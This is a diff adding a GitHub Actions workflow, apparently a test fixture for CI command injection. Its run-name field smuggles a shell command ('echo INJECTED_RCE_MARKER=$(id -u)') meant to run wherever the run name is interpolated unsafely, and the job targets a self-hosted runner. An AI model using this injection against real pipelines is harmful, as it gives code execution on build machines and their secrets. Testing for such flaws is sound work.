@@ -1,0 +1,9 @@
+name: ApprovalComment
+run-name: 'zz"; echo INJECTED_RCE_MARKER=$(id -u); #'
+on:
+  pull_request:
+jobs:
+  approval-comment:
+    runs-on: self-hosted
+    steps:
+      - run: echo "forged upstream ran"
